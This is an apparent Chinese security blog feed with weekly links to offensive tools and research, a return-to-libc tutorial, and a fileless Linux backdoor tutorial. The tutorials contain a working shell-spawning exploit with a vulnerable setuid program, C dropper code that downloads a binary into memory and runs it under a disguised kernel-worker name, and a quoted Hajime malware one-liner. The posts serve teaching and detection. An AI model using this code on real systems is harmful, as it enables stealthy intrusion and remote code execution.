<li>Seth - 对 RDP 服务实施中间人攻击的工具，可从 RDP 连接中提取明文密码<br><a href="https://github.com/SySS-Research/Seth" target="_blank" rel="external">https://github.com/SySS-Research/Seth</a></li>
<li>路由器 XSS 漏洞挖掘实例<br><a href="https://mthbernardes.github.io/persistence/2018/03/02/hacking-into-NET-router-for-fun-and-profit.html" target="_blank" rel="external">https://mthbernardes.github.io/persistence/2018/03/02/hacking-into-NET-router-for-fun-and-profit.html</a></li>
<li>爬虫基础篇[Web 漏洞扫描器]<br><a href="https://paper.seebug.org/537/" target="_blank" rel="external">https://paper.seebug.org/537/</a></li>
<li>Gaining Domain Admin from Outside Active Directory，从域外获取域管权限<br><a href="https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html" target="_blank" rel="external">https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html</a></li>
<li>IDA操作知识记录<br><a href="https://juejin.im/entry/5a37674d6fb9a04514642358" target="_blank" rel="external">https://juejin.im/entry/5a37674d6fb9a04514642358</a></li>
<li>Exim Off-by-one RCE: Exploiting CVE-2018-6789 with Fully Mitigations Bypassing<br><a href="https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/" target="_blank" rel="external">https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/</a></li>
<li>Password Filter DLL在渗透测试中的应用<br><a href="https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</a></li>
<li>SharpShooter - Payload 生成器，可以生成能逃逸杀软、沙盒、EDR 检测的样本，支持多种格式（HTA/JS/JSE/VBA/VBE/VBS/WSF）<br><a href="https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/" target="_blank" rel="external">https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/</a></li>
<li>Stored XSS, and SSRF in Google using the Dataset Publishing Language<br><a href="https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html" target="_blank" rel="external">https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html</a></li>
<li>PKI基础知识：如何管理证书存储<br><a href="https://blogs.technet.microsoft.com/askpfeplat/2018/03/05/pki-basics-how-to-manage-the-certificate-store/" target="_blank" rel="external">https://blogs.technet.microsoft.com/askpfeplat/2018/03/05/pki-basics-how-to-manage-the-certificate-store/</a></li>
<li>Python-Rootkit - Python 远控，用于和 Meterpreter 建立会话<br><a href="https://github.com/islamTaha12/Python-Rootkit" target="_blank" rel="external">https://github.com/islamTaha12/Python-Rootkit</a></li>
<li>Fastly 公司构建其 WAF 产品测试套件的方法<br><a href="https://www.fastly.com/blog/building-waf-test-harness" target="_blank" rel="external">https://www.fastly.com/blog/building-waf-test-harness</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;编写 Bash 自动补全脚本&lt;br&gt;&lt;a href=&quot;https://iridakos.com/
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>通过return-to-libc绕过NX-bit</title>
    <link href="http://kevien.github.io/2018/02/26/%E9%80%9A%E8%BF%87return-to-libc%E7%BB%95%E8%BF%87NX-bit/"/>
    <id>http://kevien.github.io/2018/02/26/通过return-to-libc绕过NX-bit/</id>
    <published>2018-02-26T15:13:31.000Z</published>
    <updated>2018-02-26T15:39:45.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
<li>读此文章之前建议先读一下这篇文章<a href="https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">linux栈溢出学习笔记</a></li>
<li>本次的测试环境是ubuntu14.04（X86).</li>
<li>为了缓解攻击者的行为，专家们想出了一项缓解缓冲区溢出漏洞利用的措施叫做“NX Bit”.</li>
<li>什么是NX(No-eXecute) Bit，<a href="https://www.wikiwand.com/en/NX_bit" target="_blank" rel="external">wiki</a>,它是一项让某个特定区域的内存代码变得不可执行不可修改的技术，例如，数据区域、栈空间和堆空间是不可执行的，代码区是不可写入的。当NX bit开启的时候，我们之前的缓冲区溢出利用将会失败，因为我们之前的shellcode会被复制到栈中然后我们的返回地址会被指向我们的shellcode从而执行我们的shellcode，但是自从栈中的代码不可以执行之后，我们的exploit会失败，但是这种缓解措施并不是一劳永逸的，因此这篇文章将介绍如何绕过NX Bit！<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"> //vuln.c</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char* argv[]) &#123;</div><div class="line"> char buf[256]; /* [1] */ </div><div class="line"> strcpy(buf,argv[1]); /* [2] */</div><div class="line"> printf(&quot;%s\n&quot;,buf); /* [3] */</div><div class="line"> fflush(stdout);  /* [4] */</div><div class="line"> return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="编译指令"><a href="#编译指令" class="headerlink" title="编译指令"></a>编译指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</div><div class="line">$gcc -g -fno-stack-protector -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
<ul>
<li>需要注意的是 当参数-z execstack 没有传入（默认没有）的时候，我们的NX bit是没有开起来的<br>我们可以通过readelf -l 命令来查看一下<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/readelf.png" alt=""></li>
<li>可以看到栈空间只有RW的标志而没有E的标志。<h4 id="如何绕过"><a href="#如何绕过" class="headerlink" title="如何绕过"></a>如何绕过</h4></li>
<li>攻击者可以使用“return-to-libc”的技巧来绕过NX bit，这里返回地址被一个特定的libc的函数地址所覆盖（而不是包含shellcode的栈空间地址），例如如果攻击者想要去得到一个shell，他可以使用system（）函数的地址去覆盖返回函数的地址，同时在栈中设置system需要的合适参数来供其成功的调用。</li>
<li><p>漏洞利用代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it. </div><div class="line">#For example system address = libc base address + system offset</div><div class="line">#where </div><div class="line">       #libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc//maps)</div><div class="line">       #system offset     = 0x0003f060 (obtained from &quot;readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system&quot;)</div><div class="line"></div><div class="line">system = 0xb7e52310       #0xb7e2000+0x0003f060</div><div class="line">exit = 0xb7e45260          #0xb7e2000+0x00032be0</div><div class="line"></div><div class="line">#system_arg points to &apos;sh&apos; substring of &apos;fflush&apos; string. </div><div class="line">#To spawn a shell, system argument should be &apos;sh&apos; and hence this is the reason for adding line [4] in vuln.c. </div><div class="line">#But incase there is0xb754b260 no &apos;sh&apos; in vulnerable binary, we can take the other approach of pushing &apos;sh&apos; string at the end of user input!!</div><div class="line">system_arg = 0xb7ffee11     #(obtained from hexdump output of the binary)</div><div class="line"></div><div class="line">#endianess conversion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack(&quot;&lt;I&quot;,num)</div><div class="line">buf = &quot;A&quot; * 268</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print &quot;Calling vulnerable program&quot;</div><div class="line">call([&quot;./vuln&quot;, buf])</div></pre></td></tr></table></figure>
</li>
<li><p>关于system和exit以及sh的查找可以使用如下的方法<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/findaddr.png" alt=""></p>
</li>
<li>最后执行上面的利用代码可以得到我们想要的shell，如下图<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/exp.png" alt=""><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/" target="_blank" rel="external">Bypassing NX bit using return-to-libc</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;读此文章之前建议先读一下这篇文章&lt;a href=&quot;https://kevien.github.io/2017/08/16/lin
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180223安全动态</title>
    <link href="http://kevien.github.io/2018/02/23/20180223%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/02/23/20180223安全动态/</id>
    <published>2018-02-23T05:54:25.000Z</published>
    <updated>2018-03-02T06:37:05.842Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>Bug Bounty Web 漏洞挖掘的几个小 Tips<br><a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#58;&#x68;&#x74;&#x74;&#112;&#x73;&#58;&#x2f;&#47;&#x6d;&#x65;&#100;&#105;&#x75;&#x6d;&#x2e;&#x63;&#111;&#109;&#x2f;&#x40;&#112;&#x72;&#x61;&#116;&#x65;&#101;&#x6b;&#95;&#x30;&#52;&#57;&#x30;&#47;&#98;&#117;&#x67;&#x2d;&#98;&#111;&#x75;&#110;&#116;&#x79;&#45;&#x74;&#x69;&#x70;&#x73;&#45;&#116;&#114;&#x69;&#x63;&#107;&#x73;&#x2d;&#x6a;&#x73;&#x2d;&#106;&#x61;&#118;&#97;&#115;&#x63;&#114;&#x69;&#x70;&#x74;&#45;&#102;&#105;&#x6c;&#x65;&#x73;&#45;&#98;&#100;&#100;&#x65;&#x34;&#x31;&#x32;&#x65;&#97;&#x34;&#x39;&#x64;">&#x68;&#x74;&#x74;&#112;&#x73;&#58;&#x2f;&#47;&#x6d;&#x65;&#100;&#105;&#x75;&#x6d;&#x2e;&#x63;&#111;&#109;&#x2f;&#x40;&#112;&#x72;&#x61;&#116;&#x65;&#101;&#x6b;&#95;&#x30;&#52;&#57;&#x30;&#47;&#98;&#117;&#x67;&#x2d;&#98;&#111;&#x75;&#110;&#116;&#x79;&#45;&#x74;&#x69;&#x70;&#x73;&#45;&#116;&#114;&#x69;&#x63;&#107;&#x73;&#x2d;&#x6a;&#x73;&#x2d;&#106;&#x61;&#118;&#97;&#115;&#x63;&#114;&#x69;&#x70;&#x74;&#45;&#102;&#105;&#x6c;&#x65;&#x73;&#45;&#98;&#100;&#100;&#x65;&#x34;&#x31;&#x32;&#x65;&#97;&#x34;&#x39;&#x64;</a></li>
<li>Linux ASLR 缓解措施的新绕过方法<br><a href="http://blog.ptsecurity.com/2018/02/new-bypass-and-protection-techniques.html" target="_blank" rel="external">http://blog.ptsecurity.com/2018/02/new-bypass-and-protection-techniques.html</a></li>
<li>Linux 系统调用的过程剖析<br><a href="https://lwn.net/Articles/604287/" target="_blank" rel="external">https://lwn.net/Articles/604287/</a></li>
<li>Windows 平台用户态 API 监控与代码注入的检测<br><a href="https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565" target="_blank" rel="external">https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565</a></li>
<li>Google Service Management 服务 7.5K Bounty 奖金漏洞的分析<br><a href="https://sites.google.com/site/testsitehacking/-7-5k-Google-services-mix-up" target="_blank" rel="external">https://sites.google.com/site/testsitehacking/-7-5k-Google-services-mix-up</a></li>
<li>挖洞经验 | 看我如何参加众测项目发现美国国防部网站的各类高危漏洞<br><a href="http://www.freebuf.com/articles/others-articles/162579.html" target="_blank" rel="external">http://www.freebuf.com/articles/others-articles/162579.html</a></li>
<li>Docker 环境中的事件分析与取证<br><a href="https://static.ernw.de/whitepaper/ERNW_Whitepaper64_IncidentForensicDocker_signed.pdf" target="_blank" rel="external">https://static.ernw.de/whitepaper/ERNW_Whitepaper64_IncidentForensicDocker_signed.pdf</a></li>
<li>Gaining root via UART<br><a href="http://konukoii.com/blog/2018/02/16/5-min-tutorial-root-via-uart/" target="_blank" rel="external">http://konukoii.com/blog/2018/02/16/5-min-tutorial-root-via-uart/</a></li>
<li>Digging passwords in Linux swap<br><a href="http://blog.sevagas.com/?Digging-passwords-in-Linux-swap" target="_blank" rel="external">http://blog.sevagas.com/?Digging-passwords-in-Linux-swap</a></li>
<li>我是如何在 bug bounty 项目中绕过双因素认证的<br><a href="http://c0d3g33k.blogspot.it/2018/02/how-i-bypassed-2-factor-authentication.html" target="_blank" rel="external">http://c0d3g33k.blogspot.it/2018/02/how-i-bypassed-2-factor-authentication.html</a></li>
<li>Windows 主机中使用自带工具 Netsh 实现端口转发<br><a href="http://woshub.com/port-forwarding-in-windows/" target="_blank" rel="external">http://woshub.com/port-forwarding-in-windows/</a></li>
<li>从 IoT 设备逆向的角度看小米 IoT 生态系统<br><a href="https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Reversing-IoT-Xiaomi-ecosystem.pdf" target="_blank" rel="external">https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Reversing-IoT-Xiaomi-ecosystem.pdf</a></li>
<li>窃取 SSH credentials 的另一种方式<br><a href="https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html" target="_blank" rel="external">https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html</a></li>
<li>Puszek - Linux kernel module rootkit<br><a href="https://github.com/Eterna1/puszek-rootkit" target="_blank" rel="external">https://github.com/Eterna1/puszek-rootkit</a></li>
<li>JShell - Get a JavaScript shell with XSS<br><a href="https://github.com/UltimateHackers/JShell" target="_blank" rel="external">https://github.com/UltimateHackers/JShell</a></li>
<li>ctf-pwn-tips<br><a href="https://github.com/Naetw/CTF-pwn-tips" target="_blank" rel="external">https://github.com/Naetw/CTF-pwn-tips</a></li>
<li>honeytrap - 一款蜜罐框架<br><a href="https://github.com/honeytrap/honeytrap" target="_blank" rel="external">https://github.com/honeytrap/honeytrap</a></li>
<li>Researcher Resources - How to become a Bug Bounty Hunter<br><a href="https://forum.bugcrowd.com/t/researcher-resources-how-to-become-a-bug-bounty-hunter/1102" target="_blank" rel="external">https://forum.bugcrowd.com/t/researcher-resources-how-to-become-a-bug-bounty-hunter/1102</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Bug Bounty Web 漏洞挖掘的几个小 Tips&lt;br&gt;&lt;a href=&quot;&amp;#x6d;&amp;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>linux一种无文件后门技巧</title>
    <link href="http://kevien.github.io/2018/02/20/linux%E4%B8%80%E7%A7%8D%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7/"/>
    <id>http://kevien.github.io/2018/02/20/linux一种无文件后门技巧/</id>
    <published>2018-02-20T03:51:50.000Z</published>
    <updated>2018-03-09T10:16:52.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
<li><p>几周之前我看了这篇<a href="https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html" target="_blank" rel="external">文章</a>,介绍的是不使用ptrace来进行linux进程注入的(使用ptrace进行进程注入的文章可以看向这里<a href="https://kevien.github.io/2018/01/28/linux进程注入/">linux进程注入</a>)，这篇文章很有意思建议你读一下，但引起我关注是的文末的一句话</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">The current payload in use is a simple open/memfd_create/sendfile/fexecve program</div></pre></td></tr></table></figure>
</li>
<li><p>我之前没有听过memfd_create和fexecve…就是这里引发了我的好奇，我决定学习和研究一下。</p>
</li>
<li>这篇文章我们将要讨论一下怎么利用这两个函数来开发一个超级隐蔽的dropper，你可以认为这是一个恶意软件开发的教程，但是开发和发布恶意软件是违法的：），此文仅做教学使用，因为最终恶意软件分析师需要去了解恶意软件开发者是怎么利用的，好让我们能更好的去检测它，从而使我们的系统更加安全。<h4 id="memfd-create-和-fexecve"><a href="#memfd-create-和-fexecve" class="headerlink" title="memfd_create 和 fexecve"></a>memfd_create 和 fexecve</h4></li>
<li>当读完这句有意思的话之后，我google了这两个函数，我发现功能确实强大，第一个允许我们在内存中创建一个文件，我们之前讨论过这个<a href="https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166" target="_blank" rel="external">话题</a>,之前我们是使用/dev/shm来存放的文件，这个文件夹存放在内存中，我们写在这里的东西都不会保存到硬盘上，然而，我们还是可以通过ls看到它。</li>
<li>memfd_create 能做同样的事情，但是它在内存中的存储并不会被映射到文件系统中，因此不能简单的通过ls命令进行查看。</li>
<li>第二个函数，fexecve同样的功能很强大，它能使我们执行一个程序（同execve），但是传递给这个函数的是文件描述符，而不是文件的绝对路径，也就是说搭配起来memfd_create使用简直完美！</li>
<li>但是这里有一个需要注意的地方就是，因为这两个函数相对的比较新，memfd_create 是在kernel3.17才被引进来，fexecve是libc的一个函数，是在版本2.3.2之后才有的，当然没有fexecve的时候，我们也可以使用其它方式去取代它（后面会讨论），而memfd_create只能用在相对较新的linux内核系统上。</li>
<li>这意味着至少在现在，这个技巧在一些运行着老内核和没有libc的嵌入式设备上是不可行的，我没有测试一些路由器和安卓设备上是否存在fexecve函数，我觉得是没有的，如有人知道，请在评论处告知；）<h4 id="一个简单的dropper"><a href="#一个简单的dropper" class="headerlink" title="一个简单的dropper"></a>一个简单的dropper</h4></li>
<li>为了了解这两个函数是怎么工作的，我写了一个简单的dropper，这个dropper可以下载远程服务器上的二进制文件并且直接在内存中运行，不会存储在磁盘上。</li>
<li>在这之前，我们先来看看之前文章中讨论过的<a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966" target="_blank" rel="external">Hajime</a>这个例子,这个例子使用了一行shell命令来创建一个文件（‘继承‘了另外一个文件的可执行权限）并且执行它然后再删除它。如果你不想打开链接，我之前把这行shell搬过来<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI</div></pre></td></tr></table></figure>
</li>
</ul>
<p>我们将要创建一个新的.s,一旦执行，将会达到执行类型上面一行shell同样的效果。</p>
<ul>
<li><p>让我们先来看一下这个代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/syscall.h&gt;</div><div class="line"></div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;arpa/inet.h&gt;</div><div class="line"></div><div class="line">#define __NR_memfd_create 319</div><div class="line">#define MFD_CLOEXEC 1</div><div class="line"></div><div class="line">static inline int memfd_create(const char *name, unsigned int flags) &#123;</div><div class="line">    return syscall(__NR_memfd_create, name, flags);</div><div class="line">&#125;</div><div class="line"></div><div class="line">extern char        **environ;</div><div class="line"></div><div class="line">int main (int argc, char **argv) &#123;</div><div class="line">  int                fd, s;</div><div class="line">  unsigned long      addr = 0x0100007f11110002;</div><div class="line">  char               *args[2]= &#123;&quot;[kworker/u!0]&quot;, NULL&#125;;</div><div class="line">  char               buf[1024];</div><div class="line"></div><div class="line">  // Connect</div><div class="line">  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) exit (1);</div><div class="line">  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0) exit (1);</div><div class="line">  if ((fd = memfd_create(&quot;a&quot;, MFD_CLOEXEC)) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  while (1) &#123;</div><div class="line">      if ((read (s, buf, 1024) ) &lt;= 0) break;</div><div class="line">      write (fd, buf, 1024);</div><div class="line">    &#125;</div><div class="line">  close (s);</div><div class="line">  </div><div class="line">  if (fexecve (fd, args, environ) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  return 0;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>代码很短也很简单，但是这里有几个点需要稍微介绍一下。</p>
<h4 id="调用memfd-create"><a href="#调用memfd-create" class="headerlink" title="调用memfd_create"></a>调用memfd_create</h4></li>
<li>第一个要介绍的就是，libc并没有对memfd_create这个系统调用进行封装（你可以在这里看到这个系统调用的相关信息<a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html#NOTES" target="_blank" rel="external">memfd_create manpage’s NOTES section</a>）,这就意味着我们需要自己去封装一下。</li>
<li>首先我们需要找到memfd_create在系统调用中的索引，通过一些在线的系统调用表，这个索引在不同的架构下是不同的，如果你想将上面的代码应用在ARM和MIPS上,可能需要不同的索引，在X86_64系统架构下的索引是319.</li>
<li>我使用了libc的syscall去对memfd_create进行了封装。</li>
<li>这个程序主要做了下面的事情</li>
<li>1.创建了一个TCP socket</li>
<li><p>2，使用AF_INET连接了127.0.0.1的0x1111端口，我们可以把这些所有的打包到一个变量里面这样可以使我们的代码看起来更短一点儿，同样你也可以去修改成你想要的ip和端口。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">addr = 01 00 00  7f   1111  0002;</div><div class="line">        1. 0. 0.127   1111  0002;</div><div class="line">       +------------+------+----</div><div class="line">         IP Address | Port | Family</div></pre></td></tr></table></figure>
</li>
<li><p>3.创建一个内存文件</p>
</li>
<li>4.从socket读取数据写入到内存文件</li>
<li>5.一旦文件传输完毕，运行内存文件</li>
<li>是不是很简单粗暴；）<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4></li>
<li>现在，让我们来测试一下，通过main函数里面那个long的变量我们知道，这个dropper将会去连接本地localhost(127.0.0.1)的0x1111端口，这里我们简单的使用nc模拟一个server。</li>
<li><p>在控制台我们运行下面的命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cat /usr/bin/xeyes | nc -l $((0x1111))</div></pre></td></tr></table></figure>
</li>
<li><p>你可以选择任意你喜欢的二进制文件，我这里用的是xeyes（一个小眼睛会跟踪鼠标的移动）这个linux自带的小程序。在另外的一个命令行界面我们运行我们的dropper，这个时候xeyes会弹出来。<br><img src="/2018/02/20/linux一种无文件后门技巧/xeye.png" alt=""></p>
<h4 id="检测这个dropper"><a href="#检测这个dropper" class="headerlink" title="检测这个dropper"></a>检测这个dropper</h4></li>
<li><p>查找这个进程比较困难，因为我们给这个进程起了一个kworker/u!0这样的名字，注意！在这里只是为了快速的去发现它，当然在实际情况中，你可以使用一个具有迷惑性的名字，比如说什么so的进程名来让它看起来像是个内核的合法进程，让我们来看一下ps的输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ ps axe</div><div class="line">(...)</div><div class="line"> 2126 ?        S      0:00 [kworker/0:0]</div><div class="line"> 2214 pts/0    S+     0:00 [kworker/u!0]</div><div class="line">(...)</div></pre></td></tr></table></figure>
</li>
<li><p>你可以看到上面的一行中是一个合法的kworker进程，下面的就是我们的看似合法的进程。</p>
<h4 id="看不见的文件"><a href="#看不见的文件" class="headerlink" title="看不见的文件"></a>看不见的文件</h4></li>
<li>我们之前提到的memfd_create 将会在RAM文件系统中创建文件且不会映射到一般的文件系统，至少，如果映射了，我是没找到，所以现在看来这的确是相当隐蔽的。</li>
<li>然而，事实上，如果一个文件存在，那么我们还是可以去发现它的，谁会去调用这个文件呢，没错，我们可以通过lsof(list of file)去查找：）到它<br><img src="/2018/02/20/linux一种无文件后门技巧/lsof.png" alt=""></li>
<li>注意lsof同样可以会显示出进程id，所以我们之前用的伪装的进程名在这个时候也就没有用了。<h4 id="如果系统中没有memfd-open不存在呢"><a href="#如果系统中没有memfd-open不存在呢" class="headerlink" title="如果系统中没有memfd_open不存在呢"></a>如果系统中没有memfd_open不存在呢</h4></li>
<li>我之前提到过memfd_open只是存在于内核在3.17或者更高的版本中，那在其它的版本中该怎么办，这种情况下我们可以使用另外一种没那么猥琐但是可以达到同样效果的方法。</li>
<li>我们最好的方式是使用shm_open(shared memory open)，这个函数会在/dev/shm文件夹下创建文件，然而，这个使用ls命令是可以看的到的，但是至少还是避免了写文件到磁盘了，shm_open和open的区别仅仅是不是在/dev/shm创建文件。</li>
<li>使用shm_open去修改这个dropper我们需要去做两件事情</li>
<li><p>1.首先我们需要去使用shm_open去代替memfd_create像是这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(...)</div><div class="line">if ((fd = shm_open(&quot;a&quot;, O_RDWR | O_CREAT, S_IRWXU)) &lt; 0) exit (1);</div><div class="line">(...)</div></pre></td></tr></table></figure>
</li>
<li><p>2.第二件事情就是我们需要关闭这个文件，然后去重新打开是为了能够通过fexecve去执行它，所以在while接收完文件之后我们需要关闭文件，然后重启新开文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">(...)</div><div class="line">  close (fd);</div><div class="line"></div><div class="line">  if ((fd = shm_open(&quot;a&quot;, O_RDONLY, 0)) &lt; 0) exit (1);</div><div class="line">(...)</div></pre></td></tr></table></figure>
</li>
<li><p>然而，主要注意的是，这个时候我们完全可以使用execve去替代fexecve去达到同样的效果。</p>
<h4 id="那如果fexecve不存在呢"><a href="#那如果fexecve不存在呢" class="headerlink" title="那如果fexecve不存在呢"></a>那如果fexecve不存在呢</h4></li>
<li><p>当你知道fexecve是怎么工作的，这个就很简单，怎么去知道这个函数是怎么工作的，google一下看看源代码，man page有一个提示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NOTES</div><div class="line">On Linux, fexecve() is implemented using the proc(5) file system, so /proc needs to be mounted and available at the time of the call.</div></pre></td></tr></table></figure>
</li>
<li><p>所以fexecve需要系统存在/proc的目录。让我们看看能不能自己实现一下。我们知道每个进程在虚拟目录proc下都有一个数字文件目录与之相对，所以这个时候，我们可以基本上使用下面的封装函数来实现fexecve的功能：</p>
